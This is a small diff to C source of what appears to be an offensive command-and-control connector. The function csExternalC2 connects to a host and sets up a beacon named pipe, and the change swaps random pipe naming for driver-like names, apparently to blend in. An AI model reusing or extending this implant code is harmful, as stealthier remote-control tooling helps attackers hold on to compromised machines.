@@ -143,7 +143,7 @@ BOOL csExternalC2(WCHAR* host, DWORD port) {
 		}
 		printMsg(STATUS_OK, LEVEL_DEFAULT, "Connected to %s:%i\n", ipAddress, port);
 
-		gen_random(pipeName, 15);
+		GenRandDriverName(pipeName, 15);
 		sprintf_s(beaconPipeName, 128, "pipename=%s", pipeName); // 9 + 15 
 		sprintf_s(filePipeName, 128, "\\\\.\\pipe\\%s", pipeName);
 
